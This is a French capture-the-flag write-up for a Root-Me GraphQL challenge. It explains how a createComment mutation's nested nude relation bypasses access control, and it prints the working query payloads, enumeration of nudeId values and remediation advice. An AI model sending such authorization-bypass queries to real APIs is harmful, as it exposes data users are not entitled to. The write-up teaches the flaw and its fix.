# Root-Me — GraphQL - Mutation

**Catégorie :** Web - Serveur
**Difficulté :** moyenne
**Endpoint :** `POST /` (endpoint GraphQL, body JSON `{"query": "..."}`)
**Type de faille :** contrôle d'accès cassé au niveau objet (Broken Object-Level
Authorization) via une relation imbriquée atteinte par une mutation

---

## 1. Résumé

L'API GraphQL expose un petit réseau social (utilisateurs, posts, commentaires) et
un type `Nude` contenant un champ `flag`. L'accès **direct** au type sensible (`nude`)
est protégé. Mais la mutation `createComment` accepte un argument `nudeId`, et le type
`Comment` possède une **relation** `nude`. En créant un commentaire pointant vers un
`nudeId`, puis en sélectionnant la relation imbriquée `nude { flag }` dans le retour de
la mutation, on lit le flag **sans jamais interroger `nude` directement** — le resolver
imbriqué ne rejoue pas le contrôle d'accès de la porte d'entrée.

---

## 2. Rappel : query vs mutation

GraphQL distingue deux familles d'opérations :

- **query** : lecture seule, ne modifie rien côté serveur.
- **mutation** : écriture — crée, modifie ou supprime des données.

Particularité importante : une mutation **retourne un objet**, interrogé comme une query
via un bloc de sélection. C'est ce bloc qui permet de traverser des relations et, ici,
de contourner la protection.

```graphql
mutation {
  createComment(userId:1, postId:1, nudeId:1, comment:"x") {
    id
    comment          # champs du Comment créé
    nude { flag }    # relation imbriquée vers Nude -> fuite du flag
  }
}
```

---

## 3. Reconnaissance

### 3.1 Introspection

L'introspection est active et révèle `rootQuery`, `rootMutation` et les types métier.

**Points de lecture (`rootQuery`)** : `user`, `post`, `nude`, `comment`.

**Points d'écriture (`rootMutation`)** :

| Mutation | Arguments | Retour |
|----------|-----------|--------|
| `createPost` | `userId!`, `slug!`, `name!`, `content!` | `Post` |
| `createComment` | `userId`, `postId`, `nudeId`, `comment!` | `Comment` |

### 3.2 Les types et leurs relations

| Type | Champs notables | Relations |
|------|-----------------|-----------|
| `User` | `id`, `username`, `email` | `posts → [Post]` |
| `Post` | `id`, `userId`, `slug`, `name`, `content` | `comments → [Comment]` |
| `Comment` | `id`, `postId`, **`nudeId`**, `comment` | **`nude → [Nude]`** |
| `Nude` | `id`, **`flag`**, `createdAt`, `updatedAt` | — |

Deux observations décisives :

1. Le flag se trouve dans **`Nude.flag`**.
2. `Comment` est relié à `Nude` à la fois par l'argument `nudeId` (en écriture, via
   `createComment`) et par le champ de relation `nude` (en lecture, via la sélection).

---

## 4. La faille

### 4.1 La porte d'entrée est fermée

Interroger directement le type sensible échoue : la query `nude` est protégée par un
contrôle d'accès (pas de droits).

```graphql
{ nude(id:1) { flag } }     # refusé / pas d'accès
```

### 4.2 La porte dérobée est ouverte

Le resolver qui résout la relation `Comment.nude` **ne revérifie pas** ces droits.
Or `createComment` nous laisse choisir le `nudeId` auquel le commentaire est rattaché.
En créant un commentaire lié à un `Nude` donné, puis en demandant `nude { flag }` dans
le retour, on lit le contenu protégé par un chemin latéral.

C'est un cas typique de **Broken Object-Level Authorization** : en GraphQL, chaque
resolver imbriqué doit appliquer ses propres contrôles. Protéger uniquement l'entrée
directe laisse les relations comme contournement.

---

## 5. Exploitation

### 5.1 Récupérer un `userId` et un `postId` valides

Les mutations référencent un utilisateur et un post existants.

```json
{"query":"{ user { id username } }"}
```
```json
{"query":"{ post { id name userId } }"}
```

On note un `userId` et un `postId` exploitables (par ex. `1` et `1`).

### 5.2 Créer le commentaire et lire la relation imbriquée

```json
{"query":"mutation { createComment(userId:1, postId:1, nudeId:1, comment:\"x\") { id comment nude { id flag } } }"}
```

Le bloc `nude { id flag }` traverse la relation et renvoie le `flag` du `Nude`
d'identifiant `nudeId`.

### 5.3 Itérer sur `nudeId`

Le flag est porté par un `Nude` précis dont l'id est inconnu. On incrémente `nudeId`
jusqu'à l'obtenir :

```json
{"query":"mutation { createComment(userId:1, postId:1, nudeId:2, comment:\"x\") { nude { id flag } } }"}
```
```json
{"query":"mutation { createComment(userId:1, postId:1, nudeId:3, comment:\"x\") { nude { id flag } } }"}
```

Le `Nude` contenant le flag renvoie la valeur recherchée dans `flag`.

> Astuce : si plusieurs `Nude` existent, on peut tester les premiers ids à la main ;
> le flag se distingue immédiatement du contenu factice des autres enregistrements.

---

## 6. Remédiation

- **Appliquer le contrôle d'accès au niveau de chaque resolver**, y compris les champs
  de relation imbriqués (`Comment.nude`), et pas seulement sur l'entrée directe `nude`.
- **Valider les références** passées en mutation (`nudeId`) : un utilisateur ne devrait
  pouvoir lier/lire que des objets auxquels il a droit.
- **Désactiver l'introspection** en production pour réduire la cartographie offerte à
  l'attaquant.
- Envisager une **autorisation centralisée** (par type/par champ) plutôt que des
  vérifications dispersées faciles à oublier sur les relations.

---

## 7. À retenir

1. Une **mutation** écrit, mais elle **retourne aussi un objet** : son bloc de sélection
   peut traverser des relations et devenir un vecteur de lecture.
2. La faille n'est pas la mutation en soi, mais le **chemin détourné** qu'elle ouvre vers
   une donnée protégée.
3. En GraphQL, protéger la porte d'entrée directe ne suffit pas : **toute relation
   imbriquée doit revérifier les droits** (Broken Object-Level Authorization).
4. Lire le schéma, c'est repérer les **relations** autant que les champs : ici,
   `Comment.nudeId` + `Comment.nude` dessinaient tout le contournement.
